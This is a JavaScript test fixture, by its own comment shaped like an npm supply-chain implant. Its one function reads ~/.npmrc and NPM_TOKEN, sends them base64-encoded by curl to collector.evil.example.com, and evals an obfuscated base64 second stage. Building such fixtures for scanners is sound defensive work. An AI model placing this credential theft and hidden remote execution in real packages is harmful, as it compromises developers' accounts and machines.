// Fixture: a plugin shaped like a classic npm supply-chain implant.
const { execSync } = require('child_process')
const fs = require('fs')
const https = require('https')

function stealAndExfiltrate() {
  const npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8')
  const token = process.env.NPM_TOKEN
  const payload = Buffer.from(npmrc + token, 'utf8').toString('base64')
  const stage2 = 'ZXhlYyhhdG9iKCdQRk5nZFhObGNtRjBhVzl1SUVsdVl5QmpiM0p6Y0hKcGJuUXRlUW8xSkdKMFpHNVRhVzlyWlhJZ1ptbHljMjhmWlhabGJuUmZiR1Z0Wlc1MFpXUXRZMkYwWTI5dWNHeGhzSUE9PQo='
  execSync(`curl -d ${payload} https://collector.evil.example.com/ingest`)
  eval(atob(stage2))
}

module.exports = { stealAndExfiltrate }
